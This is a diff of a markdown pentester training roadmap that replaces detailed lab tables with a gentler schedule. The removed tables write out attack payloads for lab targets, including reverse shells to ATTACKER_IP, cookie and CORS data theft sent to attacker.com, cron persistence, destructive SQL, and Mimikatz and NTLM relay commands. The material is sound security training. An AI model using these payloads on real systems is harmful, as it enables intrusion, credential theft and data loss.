@@ -1,230 +1,1949 @@
-# 100-DAY JUNIOR PENTESTER TRAINING PROGRAM
-**Professional Red-Team Skills Roadmap (Day 1-100)**
+# 100-Day Junior Pentester Transformation Roadmap
+
+## Executive Overview
+
+This roadmap transforms you from foundational knowledge to junior pentester readiness in 14 weeks. You'll progress from reconnaissance fundamentals through manual testing to real bug submissions, building both technical skills and a professional portfolio.
+
+**Target Outcomes:**
+- 25-35 labs/boxes completed
+- 3-5 valid bug reports submitted
+- Portfolio with 10+ writeups
+- Interview-ready GitHub repository
+- Practical web & infrastructure testing skills
 
 ---
 
-## WEEK 1 (Days 1-7): Foundation & Environment Setup
+## Weekly Roadmap Overview
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 1 | CSC473 Disaster Recovery | Environment setup, Linux hardening, OWASP Top 10 | Kali Linux, VirtualBox/VMware, Nmap, Wireshark | **Local Lab Setup** - Install Kali Linux VM with proper network configuration. Deploy DVWA and configure database. Set up VirtualBox host-only network. Perform initial Nmap scan documenting all services. Create lab environment documentation with network topology diagram. Verify all tools functional (Burp Suite, sqlmap, metasploit). |
-| 2 | CSC410 Distributed Systems | SQL Injection fundamentals and manual exploitation | Burp Suite Community, sqlmap, curl | **PortSwigger SQL Injection (Introduction) + DVWA SQLi Low** - Complete 3 PortSwigger basic SQL injection labs (retrieving hidden data, login bypass, union attacks). Manually inject into DVWA login using `' OR '1'='1`. Extract all database names using UNION SELECT. Dump users table and crack passwords. Write first professional vulnerability report with screenshots showing injection points and extracted data. |
-| 3 | CSC411 MIS | Cross-Site Scripting (Reflected, Stored, DOM) | Burp Suite, Browser DevTools, XSS Hunter | **PortSwigger Reflected XSS + Juice Shop XSS Tier 1** - Complete 3 reflected XSS labs showing alert boxes in HTML, JavaScript, and attribute contexts. Test payload variations: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`. Exploit 2 XSS challenges in OWASP Juice Shop (DOM and reflected). Document context-specific XSS payloads and filter bypass techniques with working PoCs. |
-| 4 | CSC471 Multimedia Tech | HTTP protocol deep dive, proxy interception, parameter tampering | Burp Suite, OWASP ZAP, curl, Postman | **DVWA All Modules (Low Security)** - Configure Burp Suite as intercepting proxy. Complete DVWA challenges: brute force (intercept login attempts), command injection (`127.0.0.1; cat /etc/passwd`), file inclusion (LFI to read `/etc/passwd`). Manipulate hidden parameters, modify POST data. Document each vulnerability with Burp Suite HTTP history screenshots showing request/response manipulation. |
-| 5 | CSC470 Network Protocols | CSRF attacks and session management weaknesses | Burp Suite Repeater, Cookie Editor, custom HTML | **PortSwigger CSRF + WebGoat CSRF Module** - Complete 2 CSRF labs demonstrating token absence exploitation. Build working CSRF PoC HTML page that changes victim email. Test CSRF protections: missing tokens, token not validated, token not tied to session. Complete WebGoat CSRF challenges. Document CSRF impact scenarios with proof-of-concept HTML files showing auto-submitting forms. |
-| 6 | Weekend | Web fundamentals consolidation, information gathering methodology | Nmap, Nikto, dirb, gobuster, whatweb | **TryHackMe Web Fundamentals Room** - Complete entire Web Fundamentals room (all 10 tasks). Enumerate web server identifying Apache version. Use whatweb to fingerprint technologies. Run gobuster discovering hidden directories: `/admin`, `/backup`. Use Nikto scanning for misconfigurations. Document complete reconnaissance methodology with command outputs, discovered endpoints, and technology stack analysis. |
-| 7 | Weekend | Full penetration test on beginner VM | Nmap, netcat, enum4linux, smbclient, searchsploit | **VulnHub Basic Pentesting 1 (Complete)** - Perform full pentest: Nmap all-ports scan identifying SSH, HTTP, SMB. Enumerate SMB shares finding credentials. Brute-force SSH with discovered users. Exploit ProFTPd mod_copy to upload SSH key. Escalate privileges via MySQL running as root. Capture flag. Write sanitized 5-page professional penetration test report with executive summary, technical findings, risk ratings, and remediation recommendations. |
-
-**Week 1 Cumulative KPIs:** Labs completed: 7 | Reports written: 2 | Tools mastered: 8
+| Week | Phase | Core Focus | Key Deliverables |
+|------|-------|------------|------------------|
+| 1-2 | Foundation | Web fundamentals, HTTP deep dive, recon basics | HTTP proxy proficiency, subdomain enumeration portfolio |
+| 3-4 | Web Testing I | OWASP Top 10 (Injection, XSS, Auth) | 5 OWASP Juice Shop flags, first practice report |
+| 5-6 | Web Testing II | IDOR, SSRF, business logic, API testing | 3 TryHackMe web rooms, API testing checklist |
+| 7-8 | Infrastructure | Network scanning, Linux privilege escalation | 2 HTB Easy boxes, privesc methodology doc |
+| 9-10 | Integration | Full engagement simulation, report writing | 2 complete mock assessments with reports |
+| 11-12 | Real Targets | Bug bounty recon, triage programs, first submissions | 2-3 bug submissions (any severity) |
+| 13-14 | Polish | Portfolio refinement, interview prep, advanced topics | GitHub repo live, resume finalized, 10 writeups |
 
 ---
 
-## WEEK 2 (Days 8-14): Reconnaissance & Network Enumeration
+## Detailed Weekly Breakdown
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 8 | CSC412 Operations Research | Advanced Nmap: scan types, timing, NSE scripts | Nmap, masscan, NSE scripts, AutoRecon | **TryHackMe Nmap Room (Complete)** - Complete all Nmap room tasks (15 questions). Practice scan types: TCP SYN (`-sS`), TCP Connect (`-sT`), UDP (`-sU`). Master service/version detection (`-sV`), OS detection (`-O`). Execute NSE scripts: `vuln`, `auth`, `discovery`, `exploit`. Run AutoRecon on practice target. Create comprehensive Nmap cheatsheet with real scan outputs showing timing templates, firewall evasion techniques, and NSE script results. |
-| 9 | CSC413 UNIX Systems | Passive reconnaissance and OSINT gathering | theHarvester, Shodan CLI, recon-ng, Sublist3r, Amass | **TryHackMe OSINT Room + Google Dorking** - Complete OSINT room (all tasks). Use theHarvester to collect emails/subdomains for practice domains (Tesla, Facebook). Execute 10 Google dorks: `site:tesla.com filetype:pdf`, `inurl:admin site:tesla.com`. Use Shodan CLI finding exposed services. Run Amass passive enumeration discovering 50+ subdomains. Build complete OSINT reconnaissance workflow document with discovered intelligence, tools comparison, and automation scripts. |
-| 10 | CSC473 Disaster Recovery | Directory brute-forcing and content discovery | gobuster, ffuf, dirsearch, feroxbuster, wordlists | **PortSwigger Directory Traversal + DVWA File Inclusion** - Complete 3 PortSwigger directory traversal labs reading `/etc/passwd` via path manipulation (`../../../etc/passwd`). Use gobuster with SecLists discovering: `/admin`, `/backup`, `/config`. Run ffuf with different wordlists (common.txt, directory-list-2.3-medium.txt). Exploit DVWA LFI reading sensitive files. Document directory enumeration techniques with wordlist selection strategies and recursive enumeration examples. |
-| 11 | CSC410 Distributed Systems | Service enumeration: SMB, FTP, SSH, NFS | enum4linux, smbclient, smbmap, nmap, hydra | **VulnHub Kioptrix Level 1 + TryHackMe Network Services** - Complete TryHackMe Network Services room. Scan Kioptrix: Nmap showing SMB (139/445), HTTP (80), SSH (22). Use enum4linux enumerating users, shares, groups. Access SMB shares with smbclient. Test FTP anonymous login. Banner grab SSH identifying version. Use Nmap NSE scripts `smb-enum-shares`, `ftp-anon`. Document service-specific enumeration commands with discovered information and vulnerability indicators. |
-| 12 | CSC411 MIS | Authentication attacks: brute-force, password cracking | hydra, medusa, John the Ripper, hashcat, wordlists | **PortSwigger Authentication Labs + TryHackMe Authentication Bypass** - Complete 3 authentication bypass labs: username enumeration via response differences, 2FA bypass. Brute-force DVWA login with hydra using rockyou.txt (first 1000 lines). Crack MD5/SHA1 hashes with John and hashcat. Test password spraying. Document attack methodology with success rates, timing considerations, and account lockout evasion techniques. Show hashcat cracking speeds for different algorithms. |
-| 13 | Weekend | Full reconnaissance methodology on multi-service target | All recon tools, CherryTree, OneNote for notes | **HackTheBox Starting Point: Meow + Fawn** - Complete Meow: Nmap scan, identify Telnet, enumerate users, default credentials (`root` with no password). Complete Fawn: Nmap scan, identify FTP, anonymous login, flag extraction. Document complete reconnaissance methodology in CherryTree with structured notes: network diagram, service enumeration results, credential testing, exploitation steps. Create reusable reconnaissance template. |
-| 14 | Weekend | Vulnerability scanning and professional reporting | Nessus Essentials, OpenVAS, Nikto, reporting templates | **VulnHub Kioptrix Level 1 (Complete + Full Report)** - Install Nessus Essentials, scan Kioptrix (authenticated + unauthenticated). Identify Samba trans2open vulnerability, Apache mod_ssl. Manually verify findings. Exploit using Metasploit or searchsploit. Gain root access. Write complete 10-page professional penetration test report: executive summary, scope, methodology, technical findings (CVSS scored), evidence screenshots, risk matrix, remediation roadmap. |
+### **WEEK 1: Web Fundamentals & HTTP Mastery**
 
-**Week 2 Cumulative KPIs:** Labs completed: 14 | Reports written: 4 | Tools mastered: 18
+**Learning Goals:**
+- Understand HTTP request/response cycle deeply
+- Master Burp Suite/OWASP ZAP proxy tools
+- Perform basic reconnaissance on web targets
 
----
+**Daily Tasks:**
 
-## WEEK 3 (Days 15-21): Web Application Exploitation (Advanced)
+**Day 1** (2.5hr) / (4hr variant)
+- *Read:* OWASP Testing Guide v4 - Introduction to Web Testing (1hr)
+- *Lab:* Install Burp Suite Community, complete FoxyProxy setup (0.5hr)
+- *Practice:* TryHackMe "HTTP in Detail" room (1hr) / (+2hr: Start "Web Fundamentals" path)
+- *Note:* Document all HTTP methods and status codes in your notes
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 15 | CSC471 Multimedia Tech | Blind SQL Injection: Boolean-based and Time-based | sqlmap, Burp Suite Intruder, manual payloads | **PortSwigger Blind SQLi Labs + DVWA SQLi Medium** - Complete 3 blind SQL injection labs. Test Boolean-based: `' AND '1'='1`, `' AND '1'='2` observing response differences. Execute time-based: `'; WAITFOR DELAY '00:00:05'--`, `' AND SLEEP(5)--` confirming delays. Extract database name character-by-character using substring and ASCII comparisons. Use sqlmap on DVWA medium: `sqlmap -u "URL" --cookie="COOKIE" --batch --dump`. Document time-delay payloads for MySQL, MSSQL, PostgreSQL with extraction automation techniques. |
-| 16 | CSC470 Network Protocols | Stored XSS and DOM-based XSS exploitation | Burp Suite, DOM Invader, Browser Console, BeEF | **PortSwigger Stored/DOM XSS + Juice Shop XSS Tier 2-3** - Complete 3 stored XSS labs in comment fields achieving cookie theft (`<script>document.location='http://attacker.com/?c='+document.cookie</script>`). Complete 2 DOM-based XSS labs using DOM Invader identifying sinks. Solve 3 advanced Juice Shop XSS challenges with filter bypasses: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`. Build XSS payload library with 20+ context-specific payloads (HTML, JavaScript, attribute, URL contexts). |
-| 17 | CSC412 Operations Research | XML External Entity (XXE) injection | Burp Suite, custom XXE payloads, Python HTTP server | **PortSwigger XXE Labs + WebGoat XXE Module** - Complete 4 XXE labs: file disclosure reading `/etc/passwd`, SSRF via XXE accessing internal services, blind XXE with out-of-band exfiltration. Build XXE payloads: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`. Set up Python HTTP server capturing blind XXE callbacks. Complete WebGoat XXE challenges. Create XXE payload collection for different parsers (libxml, PHP, .NET) with SSRF and data exfiltration examples. |
-| 18 | CSC413 UNIX Systems | Server-Side Request Forgery (SSRF) attacks | Burp Suite Collaborator, Webhook.site, curl | **PortSwigger SSRF Labs (All)** - Complete 5 SSRF labs: basic SSRF against local server, blacklist bypass (127.1, 2130706433 decimal IP), SSRF against backend systems. Access cloud metadata: `http://169.254.169.254/latest/meta-data/`. Access internal admin panels via SSRF. Test filter bypasses: URL encoding, DNS rebinding, redirect chains. Document SSRF impact scenarios: internal port scanning, cloud metadata theft, internal service exploitation with bypasses for common blacklists. |
-| 19 | CSC473 Disaster Recovery | Insecure deserialization exploitation | ysoserial, Burp extensions, Java debugging | **PortSwigger Deserialization Labs** - Complete 3 insecure deserialization labs achieving RCE. Analyze serialized Java objects in Burp. Use ysoserial generating Java deserialization payloads: `java -jar ysoserial.jar CommonsCollections4 'whoami'`. Modify serialized objects escalating privileges. Complete PHP deserialization challenges. Document deserialization attack chains with payload structure analysis, magic method exploitation, and gadget chain explanation for Java and PHP. |
-| 20 | Weekend | File upload vulnerabilities and RCE via upload | Weevely, PHP reverse shells, exiftool, file command | **PortSwigger File Upload Labs + DVWA Upload (All Levels)** - Complete all PortSwigger file upload labs bypassing: content-type checks, magic bytes validation, extension blacklists, path traversal. Upload PHP webshell to DVWA on all levels: low (no protection), medium (content-type bypass), high (extension + magic byte bypass). Use exiftool embedding PHP in image metadata. Generate Weevely backdoor. Achieve RCE. Document bypass techniques: double extensions, null byte injection, MIME type manipulation with working payload examples. |
-| 21 | Weekend | OS Command Injection exploitation | Burp Suite, netcat listeners, reverse shell payloads | **PortSwigger Command Injection + TryHackMe Command Injection** - Complete 5 command injection labs with various contexts: shell injection, blind command injection. Test injection characters: `;`, `|`, `&&`, `||`, backticks. Establish reverse shells: `; nc -e /bin/bash ATTACKER_IP 4444`, `; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`. Complete TryHackMe Command Injection room. Build command injection cheatsheet with 30+ payload variations for Windows/Linux and delimiter bypasses. |
+**Day 2** (2.5hr) / (4hr)
+- *Lab:* Set up OWASP Juice Shop locally via Docker (0.5hr)
+- *Practice:* Intercept and modify 10 different requests in Juice Shop (1hr)
+- *Reading:* PortSwigger Web Security Academy - "How to use Burp Suite" (1hr)
+- *(4hr):* Complete PortSwigger Academy "HTTP Request Smuggling" reading module
 
-**Week 3 Cumulative KPIs:** Labs completed: 21 | Reports written: 6 | Tools mastered: 24
+**Day 3** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Burp Suite Basics" room (1.5hr)
+- *Practice:* Install and configure OWASP ZAP, compare with Burp (1hr)
+- *(4hr):* Complete TryHackMe "Burp Suite Repeater" room
 
----
+**Day 4** (2.5hr) / (4hr)
+- *Recon:* Install subfinder, amass, assetfinder tools (0.5hr)
+- *Practice:* Perform subdomain enumeration on 3 bug bounty programs from Chaos dataset (1hr)
+- *Documentation:* Create recon methodology template (1hr)
+- *(4hr):* Add httpx, nuclei to toolkit and scan discovered subdomains
 
-## WEEK 4 (Days 22-28): Privilege Escalation & Post-Exploitation Basics
+**Day 5** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Passive Reconnaissance" room (1hr)
+- *Practice:* Google dorking - find 10 interesting findings on test sites (1hr)
+- *Tool practice:* waybackurls + filtering with grep (0.5hr)
+- *(4hr):* Complete TryHackMe "Active Reconnaissance" room
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 22 | CSC410 Distributed Systems | Linux privilege escalation enumeration | LinPEAS, LinEnum, pspy, GTFOBins, Linux-Exploit-Suggester | **TryHackMe Linux PrivEsc Room (Tasks 1-5) + VulnHub FristiLeaks** - Complete Linux PrivEsc room Tasks 1-5. Upload and run LinPEAS identifying SUID binaries, writable /etc/passwd, sudo misconfigurations. Use pspy monitoring cron jobs. Enumerate: kernel version, running processes, network connections, installed software. Start FristiLeaks enumeration. Document comprehensive Linux enumeration checklist with 50+ manual commands and automated tool comparisons showing privilege escalation vectors. |
-| 23 | CSC411 MIS | SUID/SGID binary exploitation, cron job hijacking | find, pspy, crontab, GTFOBins reference | **TryHackMe Linux PrivEsc (Tasks 6-10) + FristiLeaks Root** - Find SUID binaries: `find / -perm -4000 2>/dev/null`. Exploit using GTFOBins (find, vim, systemctl, nmap). Monitor cron with pspy identifying writable cron scripts. Hijack cron job inserting reverse shell. Complete FristiLeaks: find directory in base64 filename, upload image with PHP backdoor, escalate via sudo or cron. Write detailed privilege escalation report with exploitation timeline and command history. |
-| 24 | CSC471 Multimedia Tech | Windows privilege escalation enumeration | WinPEAS, PowerUp, Sherlock, accesschk, Sysinternals | **TryHackMe Windows PrivEsc Room (Tasks 1-6) + Local Windows VM** - Complete Windows PrivEsc room Tasks 1-6. Run WinPEAS identifying: unquoted service paths, weak service permissions, AlwaysInstallElevated registry. Use PowerUp finding vulnerable services. Use accesschk checking permissions. Enumerate: patches missing (Sherlock), scheduled tasks, stored credentials, privilege tokens. Document Windows privilege escalation enumeration methodology with PowerShell and CMD commands showing permission analysis techniques. |
-| 25 | CSC470 Network Protocols | Windows service exploitation, DLL hijacking | Metasploit, accesschk, msfvenom, icacls | **TryHackMe Windows PrivEsc (Tasks 7-12) + HTB Legacy** - Exploit unquoted service path: `C:\Program Files\Vulnerable Service\service.exe` becomes `C:\Program.exe`. Exploit weak service permissions with accesschk, replace binary. Use Metasploit exploiting Legacy (MS08-067). Generate msfvenom reverse shell. Practice token impersonation with incognito. Complete root flag. Document Windows exploitation techniques: service exploitation, DLL hijacking, token manipulation with detailed permission analysis and exploitation steps. |
-| 26 | CSC412 Operations Research | Metasploit Framework mastery (lab only) | Metasploit Framework, msfvenom, meterpreter, modules | **Metasploitable 2 + TryHackMe Metasploit Room** - Complete TryHackMe Metasploit room (all tasks). Scan and exploit 5 Metasploitable 2 services: vsftpd backdoor (6200/tcp), distcc (3632/tcp), Samba usermap script (139/445), PostgreSQL (5432), IRC backdoor. Generate meterpreter payloads: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe`. Practice post-exploitation: hashdump, screenshot, keylogger. Create Metasploit workflow cheatsheet with module selection, payload generation, and post-exploitation commands. |
-| 27 | Weekend | Reverse shell techniques and TTY stabilization | netcat, socat, rlwrap, Python pty, bash, script | **VulnHub Mr-Robot 1 (Complete)** - Exploit WordPress (WPScan finding xmlrpc, brute-force login). Upload PHP reverse shell via theme editor. Establish netcat reverse shell. Stabilize with Python: `python -c 'import pty; pty.spawn("/bin/bash")'`, Ctrl+Z, `stty raw -echo; fg`, `export TERM=xterm`. Upgrade to full TTY with socat. Find password in pcap, crack MD5. Escalate via nmap SUID. Capture all 3 keys. Write complete walkthrough with shell stabilization techniques and multiple reverse shell payload examples. |
-| 28 | Weekend | Post-exploitation: data exfiltration, persistence (lab only) | nc, scp, Python HTTP server, cron, SSH keys, systemd | **TryHackMe Post-Exploitation Basics** - Establish persistence: add cron jobs (`* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`), create backdoor users, add SSH authorized_keys, create systemd services. Exfiltrate data: Python SimpleHTTPServer (`python -m SimpleHTTPServer 8000`), netcat file transfer, scp, base64 encoding. Complete TryHackMe post-exploitation challenges. Document 15+ red-team persistence techniques with stealth considerations and detection indicators (IOCs) for blue team awareness. |
+**Weekend Day 6** (5hr) / (6hr)
+- *Major Lab:* TryHackMe "Content Discovery" room (2hr)
+- *Practice:* Run ffuf/dirsearch on 5 different practice targets (2hr)
+- *Documentation:* Write your first recon methodology writeup (1hr)
+- *(6hr):* Start building automated recon bash script
 
-**Week 4 Cumulative KPIs:** Labs completed: 28 | Reports written: 8 | Tools mastered: 35
+**Weekend Day 7** (5hr) / (6hr)
+- *Review:* Consolidate week's notes, create HTTP reference sheet (1hr)
+- *Practice:* Complete PortSwigger Academy "HTTP" labs (all free ones) (3hr)
+- *Portfolio:* Set up GitHub repo structure for documentation (1hr)
+- *(6hr):* Write detailed HTTP deep-dive blog post for portfolio
 
----
-
-## WEEK 5 (Days 29-35): Active Directory Basics & Windows Attacks
-
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 29 | CSC413 UNIX Systems | Active Directory fundamentals and enumeration | PowerView, BloodHound, SharpHound, ldapsearch, enum4linux-ng | **TryHackMe AD Basics + Local AD Lab Setup** - Complete TryHackMe Active Directory Basics room understanding forests, domains, trusts, OUs, GPOs. Set up local AD lab: Windows Server 2019 (DC) + Windows 10 client in VirtualBox. Enumerate with PowerView: `Get-NetDomain`, `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`. Use ldapsearch querying AD. Document AD structure: domain hierarchy, user accounts, groups, computers with comprehensive AD enumeration command reference. |
-| 30 | CSC473 Disaster Recovery | Kerberos attacks: Kerberoasting | Rubeus, GetUserSPNs.py (Impacket), hashcat, John | **TryHackMe Attacktive Directory (Kerberoasting Focus)** - Enumerate SPNs: `GetUserSPNs.py -dc-ip DC_IP DOMAIN/user:password`. Request TGS tickets for service accounts with Rubeus: `Rubeus.exe kerberoast`. Extract TGS-REP hashes. Crack with hashcat: `hashcat -m 13100 hash.txt rockyou.txt`. Identify vulnerable service accounts. Document complete Kerberoasting attack chain: SPN enumeration, ticket requesting, hash extraction, offline cracking with timeline, commands, and cracked credentials showing attack success. |
-| 31 | CSC410 Distributed Systems | AS-REP Roasting and password spraying | Rubeus, GetNPUsers.py, kerbrute, crackmapexec, spray.sh | **TryHackMe Attacktive Directory (AS-REP Roasting)** - Identify users with "Do not require Kerberos preauthentication": `GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt`. Request AS-REP for vulnerable users. Crack hashes offline. Execute password spraying with kerbrute: `kerbrute passwordspray -d domain.local users.txt Password123`. Use CrackMapExec validating credentials. Document user enumeration techniques and authentication attacks with spray timing considerations and account lockout avoidance strategies. |
-| 32 | CSC411 MIS | Pass-the-Hash, Pass-the-Ticket attacks (lab only) | Impacket (psexec.py, wmiexec.py, secretsdump.py), Mimikatz | **TryHackMe Lateral Movement Room** - Extract NTLM hashes with Mimikatz: `sekurlsa::logonpasswords`. Dump SAM: `lsadump::sam`. Perform Pass-the-Hash: `psexec.py -hashes :NTHASH DOMAIN/user@TARGET`. Execute commands with wmiexec.py. Move laterally across 3 systems. Perform Pass-the-Ticket attacks with silver/golden tickets. Document lateral movement techniques with NTLM hash usage, ticket manipulation, and network diagrams showing movement paths across compromised hosts. |
-| 33 | CSC471 Multimedia Tech | SMB relay attacks, NTLM relay (lab only) | Responder, ntlmrelayx.py, crackmapexec, Wireshark | **TryHackMe Breaching Active Directory** - Set up NTLM relay: run Responder capturing authentication attempts (`Responder -I eth0 -rdw`). Configure ntlmrelayx: `ntlmrelayx.py -tf targets.txt -smb2support`. Exploit SMB signing disabled. Relay captured hashes gaining code execution. Use crackmapexec checking SMB signing status. Document network-based AD attacks with packet captures showing NTLM challenge/response, relay process, and SMB signing importance with mitigation recommendations. |
-| 34 | Weekend | BloodHound analysis and attack path identification | BloodHound, Neo4j, SharpHound, custom Cypher queries | **TryHackMe Breaching AD (BloodHound Analysis)** - Collect AD data: `SharpHound.exe -c All`. Start Neo4j and BloodHound. Import collected data. Analyze attack paths: shortest path to Domain Admins, find Kerberoastable users, identify high-value targets. Write custom Cypher queries: `MATCH (u:User {hasspn:true}) RETURN u`, finding unconstrained delegation. Document BloodHound analysis methodology with graph screenshots, attack path analysis, and prioritized exploitation roadmap showing quickest route to domain compromise. |
-| 35 | Weekend | Full Active Directory penetration test simulation | All AD tools, comprehensive documentation, attack graphs | **TryHackMe Throwback Network (Day 1-2 Objectives)** - Perform complete AD pentest: initial reconnaissance (Nmap, SMB enumeration), user compromise (AS-REP roasting, password spraying), establish foothold. Plan lateral movement using BloodHound. Document reconnaissance phase with detailed notes: discovered users, computers, shares, domain structure. Create attack path diagram showing planned exploitation from initial access to domain admin compromise with specific vulnerabilities and techniques to exploit. |
-
-**Week 5 Cumulative KPIs:** Labs completed: 35 | Reports written: 10 | Tools mastered: 45
+**Week 1 Measurable Outcomes:**
+✓ Can intercept, read, and modify HTTP traffic fluently
+✓ Performed subdomain enumeration on 5+ targets
+✓ GitHub repo initialized with first writeup
+✓ Personal recon methodology documented
 
 ---
 
-## WEEK 6 (Days 36-42): Advanced Web Exploitation & API Testing
+### **WEEK 2: Advanced Recon & Information Gathering**
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 36 | CSC470 Network Protocols | Advanced SQL Injection: UNION, stacked queries, out-of-band | sqlmap, Burp Suite, custom Python scripts | **PortSwigger Advanced SQL Injection Labs** - Complete 4 union-based SQLi labs: determine column count (`' ORDER BY 1--`), find data types, extract from multiple tables. Execute stacked queries (MSSQL/PostgreSQL): `'; DROP TABLE users--`. Exploit out-of-band SQLi with DNS exfiltration. Use sqlmap with tamper scripts: `sqlmap --tamper=space2comment`. Document union-based injection methodology: column enumeration techniques (`NULL` type testing), multi-table extraction, database fingerprinting with advanced extraction automation. |
-| 37 | CSC412 Operations Research | NoSQL injection (MongoDB, CouchDB) | NoSQLMap, Burp Suite, manual payloads, MongoDB client | **PortSwigger NoSQL Injection + TryHackMe NoSQL Room** - Complete 3 NoSQL injection labs bypassing authentication with payloads: `{"username":{"$ne":null},"password":{"$ne":null}}`. Inject into MongoDB queries extracting data with `$where` operators. Test operator injection: `$gt`, `$regex`. Complete TryHackMe NoSQL room. Build NoSQL injection payload library with 25+ payloads for authentication bypass (`$ne`, `$nin`), data extraction (`$regex` brute-force), and JavaScript injection in MongoDB with detection/mitigation strategies. |
-| 38 | CSC413 UNIX Systems | API testing: REST endpoints, GraphQL, authentication flaws | Postman, curl, Arjun, GraphQL Voyager, Burp Suite | **TryHackMe API Hacking + PortSwigger API Testing** - Enumerate API endpoints with Arjun discovering hidden parameters. Test REST API: broken authentication, BOLA/IDOR (accessing other users' data), excessive data exposure. Introspect GraphQL schema: `{__schema{types{name,fields{name}}}}`. Execute GraphQL mutations. Test rate limiting, parameter pollution. Document API testing methodology with Postman collection, request/response examples, OWASP API Top 10 mapping with exploitation scenarios for each vulnerability class. |
-| 39 | CSC473 Disaster Recovery | JWT vulnerabilities and token manipulation | jwt_tool, Burp JWT extensions, Python jwt library, json.io | **PortSwigger JWT Labs + TryHackMe JWT Room** - Complete 5 JWT labs: `alg: none` bypass, weak HMAC secret cracking, algorithm confusion (RS256 to HS256), JWK header injection, KID injection. Use jwt_tool: `python jwt_tool.py TOKEN -C -d wordlist.txt` cracking weak secrets. Manipulate JWT claims escalating privileges (`"admin": true`). Complete TryHackMe JWT room. Document JWT attack techniques with decoded token structure analysis, signature bypass methods, and claim manipulation with working exploit examples. |
-| 40 | CSC410 Distributed Systems | OAuth/OIDC vulnerabilities and misconfigurations | Burp Suite, OAuth extensions, custom HTML PoCs | **PortSwigger OAuth Labs (All)** - Complete 4 OAuth labs: unverified user registration, redirect URI manipulation (`redirect_uri=https://attacker.com`), scope upgrade, forced OAuth profile linking. Exploit OAuth misconfigurations: stealing authorization codes, CSRF in OAuth flow. Access unauthorized resources. Document OAuth attack flow with sequence diagrams showing authorization code flow, implicit flow vulnerabilities, token theft techniques with mitigation strategies and secure implementation guidelines. |
-| 41 | Weekend | WebSockets security testing | Burp Suite, wscat, custom JavaScript, Wireshark | **PortSwigger WebSockets Labs (All)** - Complete all WebSocket labs. Intercept WebSocket messages with Burp: modify `{"message":"test"}` to `{"message":"<script>alert(1)</script>"}`. Exploit cross-site WebSocket hijacking (CSWSH). Test SQLi in WebSocket messages. Manipulate WebSocket handshake. Use wscat: `wscat -c ws://target.com/chat`. Document WebSocket attack surface with traffic analysis showing upgrade handshake, message interception, XSS/SQLi in real-time messages with security testing methodology. |
-| 42 | Weekend | CORS misconfigurations and origin-based attacks | Burp Suite, custom HTML PoC, browser console | **PortSwigger CORS Labs + Juice Shop CORS** - Complete 3 CORS labs: basic CORS with null origin, trusted subdomain whitelisting, internal network access. Build PoC HTML: `fetch('https://victim.com/api/account', {credentials: 'include'}).then(r=>r.text()).then(d=>location='https://attacker.com/?data='+d)`. Test origin bypasses: `null`, subdomain injection, pre-domain matching. Complete Juice Shop CORS challenges. Document CORS exploitation with working PoC pages, browser console outputs showing stolen data, and misconfiguration patterns with remediation guidance. |
+**Learning Goals:**
+- Master reconnaissance automation
+- Understand DNS, TLS/SSL fingerprinting
+- Build repeatable recon workflows
 
-**Week 6 Cumulative KPIs:** Labs completed: 42 | Reports written: 12 | Tools mastered: 52
+**Day 8** (2.5hr) / (4hr)
+- *Reading:* "The Bug Hunter's Methodology" by Jason Haddix (watch conference talk) (1hr)
+- *Practice:* Map out full attack surface for 2 bug bounty programs (1.5hr)
+- *(4hr):* Document findings in Notion/Obsidian recon tracker
 
----
+**Day 9** (2.5hr) / (4hr)
+- *Tool practice:* nmap fundamentals - scan types, timing, NSE scripts (1hr)
+- *Lab:* TryHackMe "Nmap" room (1.5hr)
+- *(4hr):* Complete "Nmap Live Host Discovery" + "Nmap Basic Port Scans" rooms
 
-## WEEK 7 (Days 43-49): Scripting Automation & Custom Exploit Development
+**Day 10** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Shodan.io" room (1hr)
+- *Practice:* Use Shodan, Censys to find interesting targets (legal hunting) (1hr)
+- *Documentation:* Add OSINT sources to recon methodology (0.5hr)
+- *(4hr):* Explore certificate transparency logs (crt.sh) + automation
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 43 | CSC411 MIS | Python for pentesting: HTTP, automation, parsing | Python 3, requests, BeautifulSoup, argparse, threading | **Custom Python Tool Development** - Write multi-threaded port scanner: `socket.connect_ex((ip, port))` with threading. Build HTTP fuzzer testing 1000 parameters with requests library. Create subdomain enumerator using DNS resolution and HTTP requests. Test tools on DVWA documenting functionality. Push to GitHub with README, usage examples, requirements.txt. Document Python pentesting libraries: requests, BeautifulSoup, scapy, socket with 5 working tool examples and code commentary. |
